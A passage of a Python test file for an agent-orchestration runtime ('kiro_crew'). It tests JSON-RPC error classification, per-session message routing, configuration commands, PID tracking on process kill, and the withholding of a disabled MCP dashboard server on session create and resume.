async def test_prompt_auth_error_not_transient():
    """An auth error response raises AcpError with transient=False so it fails
    fast — a retry cannot fix an expired/denied credential."""
    from kiro_crew.acp.client import AcpError

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:

        async def drive():
            async for _ in handle.prompt("hi", timeout=3.0):
                pass

        driver = asyncio.ensure_future(drive())
        req_id = (await _await_routed(rt, "sA"))["sA"]
        _feed(
            reader,
            {
                "id": req_id,
                "error": {
                    "code": -32603,
                    "message": "Internal error",
                    "data": "ExpiredTokenException: signature expired",
                },
            },
        )
        with pytest.raises(AcpError) as excinfo:
            await await_until(driver, what="the driver finishing its turn")
        assert excinfo.value.transient is False
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_wait_for_response_transient_error_sets_flag():
    """The non-streaming _wait_for_response path also classifies a transient
    backend 5xx (a -32603 InternalServerError) as transient=True, so
    request/response turns (session/new, set_mode, cancel, …) share the same
    retry eligibility. Covers the second kiro raise site."""
    from kiro_crew.acp.client import AcpError

    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    q["sA"].put_nowait(
        JsonRpcMessage.from_dict(
            {
                "id": 7,
                "error": {
                    "code": -32603,
                    "message": "Internal error",
                    "data": (
                        "Encountered an error in the response stream: "
                        "InternalServerError ... please try again."
                    ),
                },
            }
        )
    )
    with pytest.raises(AcpError) as excinfo:
        await handle._wait_for_response(7, timeout=3.0)
    assert excinfo.value.transient is True


# ── Runtime properties ──


@pytest.mark.asyncio
async def test_runtime_pid():
    rt, _, _ = _make_runtime()
    assert rt.pid == 4242


# ── Multi-session routing: stronger guarantees ──


@pytest.mark.asyncio
async def test_n_sessions_routed_independently():
    """Five concurrent prompt turns on ONE runtime each receive exactly their
    own session's text + completion — no cross-talk at higher fan-out.
    """
    n = 5
    sids = [f"s{i}" for i in range(n)]
    rt, reader, _ = _make_runtime()
    q = _register(rt, *sids)
    handles = {sid: AcpSessionHandle(sid, q[sid], rt) for sid in sids}
    task = await _start_reader(rt)

    out: dict[str, list] = {sid: [] for sid in sids}

    async def drive(sid):
        async for ev in handles[sid].prompt("go", timeout=5.0):
            out[sid].append(ev)

    drivers = [asyncio.ensure_future(drive(sid)) for sid in sids]
    try:
        sid_to_req = await _await_routed(rt, *sids)
        assert set(sid_to_req) == set(sids), "all prompts must be in flight"

        # Feed each session a uniquely-identifying text chunk, reverse order.
        for sid in reversed(sids):
            _feed(
                reader,
                {
                    "method": METHOD_SESSION_UPDATE,
                    "params": {
                        "sessionId": sid,
                        "update": {"sessionUpdate": "agent_message_chunk", "text": f"text-{sid}"},
                    },
                },
            )
        # Complete every turn (responses routed by id).
        for sid in sids:
            _feed(reader, {"id": sid_to_req[sid], "result": {"stopReason": "end_turn"}})

        await await_until(asyncio.gather(*drivers), what="every driver finishing its turn")

        for sid in sids:
            text = "".join(e.text for e in out[sid] if e.kind == EVENT_TEXT_CHUNK)
            assert text == f"text-{sid}", f"session {sid} got wrong/cross text: {text!r}"
            assert any(e.kind == EVENT_COMPLETE for e in out[sid])
    finally:
        for t in drivers:
            if not t.done():
                t.cancel()
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_one_session_errors_others_unaffected():
    """When one session's turn errors, the other concurrent session still
    completes normally — failures are isolated per session.
    """
    from kiro_crew.acp.client import AcpError

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sOk", "sErr")
    h_ok = AcpSessionHandle("sOk", q["sOk"], rt)
    h_err = AcpSessionHandle("sErr", q["sErr"], rt)
    task = await _start_reader(rt)

    ok_out: list = []
    err_exc: list = []

    async def drive_ok():
        async for ev in h_ok.prompt("go", timeout=5.0):
            ok_out.append(ev)

    async def drive_err():
        try:
            async for _ in h_err.prompt("go", timeout=5.0):
                pass
        except AcpError as exc:  # noqa: BLE001
            err_exc.append(exc)

    d_ok = asyncio.ensure_future(drive_ok())
    d_err = asyncio.ensure_future(drive_err())
    try:
        sid_to_req = await _await_routed(rt, "sOk", "sErr")
        # sErr gets an error response; sOk gets text + normal completion.
        _feed(reader, {"id": sid_to_req["sErr"], "error": {"code": -1, "message": "boom"}})
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sOk",
                    "update": {"sessionUpdate": "agent_message_chunk", "text": "fine"},
                },
            },
        )
        _feed(reader, {"id": sid_to_req["sOk"], "result": {"stopReason": "end_turn"}})

        await await_until(asyncio.gather(d_ok, d_err), what="every driver finishing its turn")

        assert len(err_exc) == 1, "errored session should raise AcpError"
        ok_text = "".join(e.text for e in ok_out if e.kind == EVENT_TEXT_CHUNK)
        assert ok_text == "fine"
        assert any(e.kind == EVENT_COMPLETE for e in ok_out)
        # The errored session's turn is marked done (does not wedge the runtime).
        assert not h_err.is_turn_active
    finally:
        for t in (d_ok, d_err):
            if not t.done():
                t.cancel()
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_interleaved_tool_calls_routed_per_session():
    """tool_call frames for two concurrent sessions are each delivered only to
    the originating session's stream.
    """
    from kiro_crew.acp.types import EVENT_TOOL_CALL

    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    h_a = AcpSessionHandle("sA", q["sA"], rt)
    h_b = AcpSessionHandle("sB", q["sB"], rt)
    task = await _start_reader(rt)

    out_a: list = []
    out_b: list = []

    async def drive(handle, out):
        async for ev in handle.prompt("go", timeout=5.0):
            out.append(ev)

    da = asyncio.ensure_future(drive(h_a, out_a))
    db = asyncio.ensure_future(drive(h_b, out_b))
    try:
        sid_to_req = await _await_routed(rt, "sA", "sB")
        # Interleave tool calls for each session.
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {
                        "sessionUpdate": "tool_call",
                        "toolCallId": "a1",
                        "title": "toolA",
                        "kind": "shell",
                    },
                },
            },
        )
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sB",
                    "update": {
                        "sessionUpdate": "tool_call",
                        "toolCallId": "b1",
                        "title": "toolB",
                        "kind": "fs",
                    },
                },
            },
        )
        _feed(reader, {"id": sid_to_req["sA"], "result": {"stopReason": "end_turn"}})
        _feed(reader, {"id": sid_to_req["sB"], "result": {"stopReason": "end_turn"}})
        await await_until(asyncio.gather(da, db), what="every driver finishing its turn")

        tc_a = [e for e in out_a if e.kind == EVENT_TOOL_CALL]
        tc_b = [e for e in out_b if e.kind == EVENT_TOOL_CALL]
        assert len(tc_a) == 1 and tc_a[0].tool_call_id == "a1" and tc_a[0].title == "toolA"
        assert len(tc_b) == 1 and tc_b[0].tool_call_id == "b1" and tc_b[0].title == "toolB"
        # No cross-talk: session A never saw session B's tool call and vice versa.
        assert all(e.tool_call_id != "b1" for e in out_a)
        assert all(e.tool_call_id != "a1" for e in out_b)
    finally:
        for t in (da, db):
            if not t.done():
                t.cancel()
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_destroyed_session_stops_receiving_frames():
    """After a session is destroyed, frames tagged with its id are dropped and
    do NOT leak into a sibling session that is still active.
    """
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    # destroy() now round-trips _kiro.dev/session/terminate; no reader is running
    # yet here, so ack it instantly to avoid the bounded terminate timeout.
    rt._send_and_await = AsyncMock(return_value={})  # type: ignore[method-assign]
    h_a = AcpSessionHandle("sA", q["sA"], rt)
    await h_a.destroy()  # sA terminated + unregistered
    task = await _start_reader(rt)
    try:
        # Frame for the destroyed session must be dropped (not broadcast to sB).
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "agent_message_chunk", "text": "ghost"},
                },
            },
        )
        # A legitimate frame for sB still routes.
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sB",
                    "update": {"sessionUpdate": "agent_message_chunk", "text": "live"},
                },
            },
        )
        msg = await _next(q["sB"])
        assert msg.params["sessionId"] == "sB"
        # sB's queue must not contain the ghost frame.
        assert q["sB"].empty()
    finally:
        await _stop_reader(task)


# ── Tests for Phase 3 unification: AcpSessionHandle gap-fill methods ──


class TestAcpSessionHandleCommands:
    """Tests for send_command and set_config_option."""

    @pytest.mark.asyncio
    async def test_send_command_plain(self):
        """send_command with no args sends plain string command."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        # Mock send_request to capture what's sent and return a fake req_id
        sent_payloads = []
        req_counter = [100]

        async def capture_send(method, params, **_kw):
            sent_payloads.append((method, params))
            req_id = req_counter[0]
            req_counter[0] += 1
            # Put a fake response in the queue so _wait_for_response resolves
            resp_msg = JsonRpcMessage.from_dict({"id": req_id, "result": {"text": "compacted"}})
            await q["s1"].put(resp_msg)
            return req_id

        rt.send_request = capture_send
        result = await handle.send_command("/compact")
        assert result == "compacted"
        assert sent_payloads[0][0] == METHOD_COMMANDS_EXECUTE
        assert sent_payloads[0][1]["command"] == "/compact"
        assert sent_payloads[0][1]["sessionId"] == "s1"

    @pytest.mark.asyncio
    async def test_send_command_with_args(self):
        """send_command with args sends TuiCommand object form."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        sent_payloads = []
        req_counter = [200]

        async def capture_send(method, params, **_kw):
            sent_payloads.append((method, params))
            req_id = req_counter[0]
            req_counter[0] += 1
            resp_msg = JsonRpcMessage.from_dict({"id": req_id, "result": {"text": "ok"}})
            await q["s1"].put(resp_msg)
            return req_id

        rt.send_request = capture_send
        result = await handle.send_command("/effort", args={"level": "high"})
        assert result == "ok"
        cmd = sent_payloads[0][1]["command"]
        assert isinstance(cmd, dict)
        assert cmd["command"] == "effort"
        assert cmd["args"] == {"level": "high"}

    @pytest.mark.asyncio
    async def test_set_config_option(self):
        """set_config_option sends correct JSON-RPC request."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        sent_payloads = []
        req_counter = [300]

        async def capture_send(method, params, **_kw):
            sent_payloads.append((method, params))
            req_id = req_counter[0]
            req_counter[0] += 1
            resp_msg = JsonRpcMessage.from_dict({"id": req_id, "result": {}})
            await q["s1"].put(resp_msg)
            return req_id

        rt.send_request = capture_send
        await handle.set_config_option("effort", "high")
        assert sent_payloads[0][0] == METHOD_SET_CONFIG_OPTION
        assert sent_payloads[0][1] == {
            "sessionId": "s1",
            "configId": "effort",
            "value": "high",
        }


class TestAcpSessionHandleState:
    """Tests for state tracking properties."""

    def test_initial_state(self):
        """New handle has empty state."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)
        assert handle.model == ""
        assert handle.config_options == []
        assert handle.available_models == []

    def test_store_session_config(self):
        """store_session_config populates configOptions and available models."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        resp = {
            "sessionId": "s1",
            "configOptions": [
                {"id": "effort", "options": [{"value": "low"}, {"value": "high"}]},
            ],
            "models": {
                "availableModels": [
                    {"modelId": "opus-4", "name": "Claude Opus 4"},
                    {"modelId": "sonnet-4", "name": "Claude Sonnet 4"},
                ],
            },
        }
        handle.store_session_config(resp)
        assert len(handle.config_options) == 1
        assert handle.config_options[0]["id"] == "effort"
        assert len(handle.available_models) == 2
        assert handle.available_models[0]["modelId"] == "opus-4"

    def test_supports_config_option(self):
        """supports_config_option checks for matching id."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        # No options yet — returns True (lazy backend assumption)
        assert handle.supports_config_option("effort") is True

        handle._config_options = [{"id": "effort", "options": []}]
        assert handle.supports_config_option("effort") is True
        assert handle.supports_config_option("mode") is False

    def test_get_valid_effort_levels(self):
        """get_valid_effort_levels extracts from config options."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        handle._config_options = [
            {
                "id": "effort",
                "options": [
                    {"value": "low", "label": "Low"},
                    {"value": "medium", "label": "Medium"},
                    {"value": "high", "label": "High"},
                ],
            },
        ]
        assert handle.get_valid_effort_levels() == ["low", "medium", "high"]

    def test_set_model_updates_state(self):
        """set_model updates the _model field."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)
        # Directly set to test the state (set_model is async and would need send_request)
        handle._model = "opus-4"
        assert handle.model == "opus-4"

    def test_config_option_update_in_handle_update(self):
        """_handle_update processes config_option_update by updating state."""
        rt, _, _ = _make_runtime()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)

        msg = JsonRpcMessage.from_dict(
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "s1",
                    "update": {
                        "sessionUpdate": "config_option_update",
                        "configOptions": [
                            {"id": "effort", "options": [{"value": "extreme"}]},
                        ],
                    },
                },
            }
        )
        events = handle._handle_update(msg)
        assert events == []  # No event emitted
        assert len(handle._config_options) == 1
        assert handle._config_options[0]["id"] == "effort"


class TestAcpSessionHandleResponsiveness:
    """Tests for is_responsive."""

    def test_responsive_when_alive_and_recent(self):
        """is_responsive returns True when runtime is alive with recent activity."""
        rt, _, _ = _make_runtime()
        rt._last_activity = time.monotonic()
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)
        assert handle.is_responsive() is True

    def test_not_responsive_when_stale(self):
        """is_responsive returns False when activity is old."""
        rt, _, _ = _make_runtime()
        rt._last_activity = time.monotonic() - 700  # 700s ago, threshold is 600
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)
        assert handle.is_responsive(stale_threshold=600.0) is False

    def test_not_responsive_when_dead(self):
        """is_responsive returns False when runtime is dead."""
        rt, _, _ = _make_runtime()
        rt._dead = True
        q = _register(rt, "s1")
        handle = AcpSessionHandle("s1", q["s1"], rt)
        assert handle.is_responsive() is False


class TestAcpRuntimePidTracking:
    """kill() must untrack the runtime PID from the orphan-sweep files so a
    dead entry isn't chased (mirrors AcpClient._reset_state). Spawn-side
    tracking is covered indirectly — it uses the same session_pid helpers."""

    @pytest.mark.asyncio
    async def test_kill_untracks_pid(self, monkeypatch):
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)

        calls: dict[str, list[int]] = {"pid": [], "session": []}
        import kiro_crew.acp.runtime as rt_mod
        import kiro_crew.session_pid as pid_mod

        def untrack(kind, pid):
            calls[kind].append(pid)
            return True

        if rt_mod.platform_compat.IS_WINDOWS:
            # Windows retires metadata inside the owned drain, under its pin.
            # Keep that path real and replace only the kernel-facing operations.
            pc = rt_mod.platform_compat
            monkeypatch.setattr(pc, "_WINDOWS_TREE_ADMISSIONS", set())
            monkeypatch.setattr(pc, "_PENDING_WINDOWS_TREE_CLEANUPS", {})
            monkeypatch.setattr(pc, "duplicate_asyncio_process_handle", lambda p: 5151)
            monkeypatch.setattr(pc, "_windows_process_handle_identity", lambda h: (4242, 77, 88))
            monkeypatch.setattr(pc, "_drain_windows_process_tree", lambda state: True)
            monkeypatch.setattr(pc, "close_process_handle", lambda h: None)
            monkeypatch.setattr(pid_mod, "_untrack_pid", lambda p: untrack("pid", p))
            monkeypatch.setattr(pid_mod, "_untrack_session_pid", lambda p: untrack("session", p))
        else:
            monkeypatch.setattr(rt_mod, "_untrack_pid", lambda p: untrack("pid", p))
            monkeypatch.setattr(rt_mod, "_untrack_session_pid", lambda p: untrack("session", p))
            monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
            monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)

        await rt.kill()

        assert calls["pid"] == [4242]
        assert calls["session"] == [4242]

    @pytest.mark.asyncio
    async def test_kill_retires_by_identity_when_a_spawn_token_is_held(self, monkeypatch):
        """The reap proved THIS process dead, not that its number is still ours:
        a root spawned since can already hold it. So the kill path retires the
        line that names this process (the token read at spawn), never the lines
        that merely carry the number."""
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)
        rt._spawn_start_token = "tok-a"

        import kiro_crew.acp.runtime as rt_mod

        if rt_mod.platform_compat.IS_WINDOWS:
            pytest.skip("the Windows owned drain retires under its pin; covered separately")
        identity_calls: list[tuple[int, str]] = []

        def _by_identity(pid, token):
            identity_calls.append((pid, token))
            return True

        def _never(*_a):
            raise AssertionError("prefix-matched untrack ran although a token was held")

        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", _by_identity)
        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", _never)
        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)

        await rt.kill()

        assert identity_calls == [(4242, "tok-a")]

    @pytest.mark.asyncio
    async def test_kill_clears_the_bare_line_only_while_dead_when_no_session_line_was_ours(
        self, monkeypatch
    ):
        """Identity retirement found no line of ours (spawn's append failed, or a
        successor already replaced it). The bare line still goes -- but through
        the probe-under-lock helper, never by number alone."""
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)
        rt._spawn_start_token = "tok-a"

        import kiro_crew.acp.runtime as rt_mod

        if rt_mod.platform_compat.IS_WINDOWS:
            pytest.skip("the Windows owned drain retires under its pin; covered separately")
        if_dead_calls: list[int] = []

        def _never(*_a):
            raise AssertionError("prefix-matched untrack ran although a token was held")

        monkeypatch.setattr(rt_mod, "_untrack_root_by_identity", lambda pid, token: False)
        monkeypatch.setattr(rt_mod, "_untrack_pid_if_dead", lambda pid: if_dead_calls.append(pid))
        monkeypatch.setattr(rt_mod, "_untrack_pid", _never)
        monkeypatch.setattr(rt_mod, "_untrack_session_pid", _never)
        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)

        await rt.kill()

        assert if_dead_calls == [4242]

    @pytest.mark.asyncio
    async def test_kill_keeps_pid_tracked_when_the_process_survives(self, monkeypatch):
        """A survivor must STAY tracked so the orphan sweeps can still reach it.

        The counterpart to the test above, and the reason that one has to stub
        `pid_exists` rather than rely on the ambient process table: untracking a
        process that outlived SIGTERM/SIGKILL escalation would leak it until
        reboot, because the sweep would then have no handle on it.
        """
        rt, _, proc = _make_runtime()
        proc.wait = AsyncMock(return_value=0)

        calls: dict[str, list[int]] = {"pid": [], "session": []}
        import kiro_crew.acp.runtime as rt_mod

        monkeypatch.setattr(rt_mod, "_untrack_pid", lambda p: calls["pid"].append(p))
        monkeypatch.setattr(rt_mod, "_untrack_session_pid", lambda p: calls["session"].append(p))
        monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: True)
        monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a: None)
        monkeypatch.setattr(
            rt_mod.platform_compat,
            "terminate_windows_asyncio_tree",
            AsyncMock(side_effect=OSError("fixture tree still alive")),
        )

        if rt_mod.platform_compat.IS_WINDOWS:
            with pytest.raises(OSError, match="fixture tree still alive"):
                await rt.kill()
            assert rt._process is proc
        else:
            await rt.kill()

        assert calls["pid"] == []
        assert calls["session"] == []


def _identity_tokens(elements):
    """The per-session token carried by each of *elements*, in order.

    A missing pair yields ``""`` for that element, so a caller can tell "every
    element carries one" from "one of them stopped".
    """
    out = []
    for element in elements:
        env = element.get("env")
        pairs = env if isinstance(env, list) else []
        value = ""
        for pair in pairs:
            if isinstance(pair, dict) and pair.get("name") == STUB_SESSION_TOKEN_ENV:
                value = str(pair.get("value") or "")
        out.append(value)
    return out


def _without_identity_env(elements):
    """*elements* with the per-session identity VALUE dropped from each.

    Lets a comparison assert on the stub SET — names, commands, args, and every
    other env pair — without asserting that two different sessions were given the
    same session token, which they must not be.

    Only the VALUE is excluded, never the pair's presence: the pair is rewritten to
    a fixed placeholder rather than removed, so an element that stops carrying a
    token at all still differs from one that carries a different token. Removing it
    outright is what made the ratchet blind to a token disappearing — the
    comparison alone cannot see presence, so :func:`_identity_tokens` is asserted
    beside it.
    """
    out = []
    for element in elements:
        shaped = dict(element)
        env = shaped.get("env")
        if isinstance(env, list):
            shaped["env"] = [
                (
                    {"name": STUB_SESSION_TOKEN_ENV, "value": "<per-session>"}
                    if isinstance(pair, dict) and pair.get("name") == STUB_SESSION_TOKEN_ENV
                    else pair
                )
                for pair in env
            ]
        out.append(shaped)
    return out


class TestRuntimeMemberDispatchDisabled:
    """A switched-off dashboard server is not mounted on EITHER runtime path.

    ``AcpRuntime`` composes the array for an ``ACP_BACKENDS_ACP_RUNTIME`` host, and the
    member entry it appends is outside every rule that array is filtered by -- the
    ``tools`` allowlist that keeps a disabled server out of a projected array never
    sees an element appended after it. ``disabled`` also has no per-tool or per-call
    spelling, so no harness can refuse a call to a server it was handed: not mounting
    it is the only place the operator's switch-off can be honoured.

    Both paths are pinned because ``session/load`` RE-INITIALIZES the session's
    servers, so a resume that did not ask would re-mount a server the original
    ``session/new`` withheld.
    """

    MEMBER_KEY = "dashboard_member-autofix"

    @staticmethod
    def _switch_off(monkeypatch, tmp_path, *, disabled: bool):
        """Write the switch where the dashboard's own MCP action writes it."""
        import kiro_crew.agent as agent_mod
        from kiro_crew.members import MEMBER_DISPATCH_SERVER

        settings = tmp_path / "mcp.json"
        entry = {"disabled": True} if disabled else {}
        settings.write_text(
            json.dumps({"mcpServers": {MEMBER_DISPATCH_SERVER: entry}}), encoding="utf-8"
        )
        monkeypatch.setattr(agent_mod, "_KIRO_MCP_JSON", settings)
        return MEMBER_DISPATCH_SERVER

    @pytest.mark.asyncio
    @pytest.mark.parametrize("disabled", [True, False])
    async def test_create_session_asks_before_mounting(self, monkeypatch, tmp_path, disabled):
        server = self._switch_off(monkeypatch, tmp_path, disabled=disabled)
        rt, _, _ = _make_runtime()
        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_NEW:
                return {"sessionId": "sid-new", "modes": {"currentModeId": "kirocrew"}}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        await rt.create_session(cwd="/work", agent="kirocrew", member_session_key=self.MEMBER_KEY)
        params = next(p for m, p in sent if m == METHOD_SESSION_NEW)
        names = [e["name"] for e in params["mcpServers"]]
        assert (server in names) is (not disabled), names

    @pytest.mark.asyncio
    @pytest.mark.parametrize(("member", "disabled"), [(True, True), (True, False), (False, False)])
    async def test_the_handle_records_the_mount(self, monkeypatch, tmp_path, member, disabled):
        """The context builder teaches the session_* tools off this flag, so it
        must carry exactly the answer the array got -- withheld, mounted, or a
        non-member session that never had the entry."""
        self._switch_off(monkeypatch, tmp_path, disabled=disabled)
        rt, _, _ = _make_runtime()

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_NEW:
                return {"sessionId": "sid-new", "modes": {"currentModeId": "kirocrew"}}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        handle = await rt.create_session(
            cwd="/work",
            agent="kirocrew",
            member_session_key=self.MEMBER_KEY if member else "",
        )
        assert handle.member_dispatch_mounted is (member and not disabled)

    def test_the_resume_path_records_the_mount_on_its_handle(self):
        """The load half, pinned on its source for the reason the grant pin below gives:
        driving a resume needs the re-attach bracket this fake transport does not answer."""
        import inspect

        from kiro_crew.acp.runtime import AcpRuntime

        source = inspect.getsource(AcpRuntime.load_session)
        assert "member_mounted = member_entry is not None" in source
        assert "handle.member_dispatch_mounted = member_mounted" in source

    def test_the_scope_comes_from_the_one_decider(self):
        """The switch-off has to be read where this host resolves its agent.

        ``session_mcp`` resolves a spec project-nearest and does NOT fall back, so on a
        host that runs the USER-level agent (KAS) a same-named file in the checkout would
        decide the answer for a session that never reads it: a disable written where that
        session's agent actually lives would read as "not disabled" and the withdrawn
        server would mount. Asserted against ``overlay_project_scope`` rather than
        against a literal, because that function is the decider the array's own
        projection uses and these two must not come apart.
        """
        from kiro_crew.acp.runtime import _disable_check_scope
        from kiro_crew.agent_sdk.backends import overlay_project_scope

        for backend in ("kas", "codex", "kiro", "opencode", "claude"):
            assert _disable_check_scope(backend, "/work") == overlay_project_scope(
                backend, "/work"
            ).get("work_dir"), backend
        # The case the mismatch would hide: KAS reads no checkout at all.
        assert _disable_check_scope("kas", "/work") is None

    @pytest.mark.asyncio
    @pytest.mark.parametrize("disabled", [True, False])
    async def test_the_kas_grant_follows_the_withhold(self, monkeypatch, tmp_path, disabled):
        """Withholding the mount has to withhold the GRANT with it.

        ``member_dispatch=True`` widens the KAS agent payload: the dashboard server joins
        ``tools`` and the member verbs join ``allowedTools``, which is an approval-free
        path. A grant that outlived the withhold would leave a switched-off server both
        named and pre-approved on the very session that is not mounting it -- worse than
        an unguarded mount, because nothing would even ask.

        Read off the flag reaching ``_kas_custom_agents`` rather than off a KAS wire
        payload: ``create_session`` enters that seam for every host (it answers None for a
        non-KAS one), so the decision is observable without a KAS session to drive.
        """
        from kiro_crew.acp.harness.base import SessionExtras

        self._switch_off(monkeypatch, tmp_path, disabled=disabled)
        rt, _, _ = _make_runtime()
        seen: list[bool] = []

        async def _capture(_agent, *, member_dispatch=False, crew_panel=False, session_key=""):
            seen.append(member_dispatch)
            return SessionExtras(custom_agents=None, derived_spec_snapshot=None)

        monkeypatch.setattr(rt, "_kas_custom_agents", _capture)

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_NEW:
                return {"sessionId": "sid-new", "modes": {"currentModeId": "kirocrew"}}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        await rt.create_session(cwd="/work", agent="kirocrew", member_session_key=self.MEMBER_KEY)
        assert seen == [not disabled], (seen, disabled)

    def test_the_resume_path_carries_the_same_grant_expression(self):
        """The resume half, pinned where it can be: its own source.

        The seam is entered only for KAS on that path -- by design, so the kiro resume
        reaches a comparison and stops -- and driving a KAS resume needs the whole
        re-attach and activation bracket this suite's fake transport does not answer. A
        source pin still fails if the term is dropped from one path and kept on the other,
        which is the drift that matters: the two halves of one feature disagreeing.
        """
        import inspect

        from kiro_crew.acp.runtime import AcpRuntime

        for method in (AcpRuntime.create_session, AcpRuntime.load_session):
            source = inspect.getsource(method)
            assert (
                "member_dispatch=bool(member_session_key) and not member_withheld" in source
            ), method.__name__

    @pytest.mark.asyncio
    @pytest.mark.parametrize("path", ["create", "load"])
    async def test_both_paths_pass_that_scope(self, monkeypatch, path):
        """Not just the helper: the value each path actually hands the reader."""
        from kiro_crew.acp import runtime as runtime_mod
        from kiro_crew.members import MEMBER_DISPATCH_SERVER, MEMBER_PANEL_SERVER

        seen: list[tuple[str, object]] = []

        def _capture(name, _agent, *, work_dir=None):
            seen.append((name, work_dir))
            return False

        # The per-tool reader is the THIRD read on these paths and takes the same
        # scope, so it is captured here too: left real it would be handed the
        # sentinel below and fail on it, and the property under test is that every
        # reader gets the decider's answer.
        tool_scopes: list[object] = []

        def _capture_tools(_agent, *, work_dir=None):
            tool_scopes.append(work_dir)
            return frozenset()

        monkeypatch.setattr(runtime_mod, "session_mcp_server_is_disabled", _capture)
        monkeypatch.setattr(runtime_mod, "session_mcp_disabled_tools", _capture_tools)
        rt, _, _ = _make_runtime()
        rt._can_load_session = True

        async def _fake_send(method, params, timeout=None):
            if method == METHOD_SESSION_NEW:
                return {"sessionId": "sid-new", "modes": {"currentModeId": "kirocrew"}}
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        # A sentinel rather than a checkout path: the default runtime backend is not
        # user-level-only, so its scope and the raw session checkout are the SAME
        # string, and a call site that skipped the decider would pass that assertion.
        # Identity against the decider's answer cannot be reached any other way.
        scope = object()
        monkeypatch.setattr(runtime_mod, "_disable_check_scope", lambda _backend, _wd: scope)
        if path == "create":
            await rt.create_session(
                cwd="/work", agent="kirocrew", member_session_key=self.MEMBER_KEY
            )
        else:
            await rt.load_session(
                "/home/u/.kiro/sessions/cli/sid-123.json",
                "sid-123",
                cwd="/work",
                agent="kirocrew",
                member_session_key=self.MEMBER_KEY,
            )
        assert {name for name, _ in seen} == {
            MEMBER_DISPATCH_SERVER,
            MEMBER_PANEL_SERVER,
        }, seen
        # EVERY call, not just the first: all three reads on these paths take the
        # same switch scope, and one of them resolving its own is the mismatch
        # this pins shut.
        assert all(work_dir is scope for _, work_dir in seen), seen
        assert tool_scopes, "the per-tool switch must be read too"
        assert all(work_dir is scope for work_dir in tool_scopes), tool_scopes

    @pytest.mark.asyncio
    @pytest.mark.parametrize("disabled", [True, False])
    async def test_load_session_asks_again_on_resume(self, monkeypatch, tmp_path, disabled):
        server = self._switch_off(monkeypatch, tmp_path, disabled=disabled)
        rt, _, _ = _make_runtime()
        rt._can_load_session = True
        sent: list[tuple[str, dict]] = []

        async def _fake_send(method, params, timeout=None):
            sent.append((method, params))
            if method == METHOD_SESSION_LOAD:
                return {"modes": {"currentModeId": "kirocrew"}, "models": []}
            return {}

        monkeypatch.setattr(rt, "_send_and_await", _fake_send)
        await rt.load_session(
            "/home/u/.kiro/sessions/cli/sid-123.json",
            "sid-123",
            cwd="/work",
            agent="kirocrew",
            member_session_key=self.MEMBER_KEY,
        )
        params = next(p for m, p in sent if m == METHOD_SESSION_LOAD)
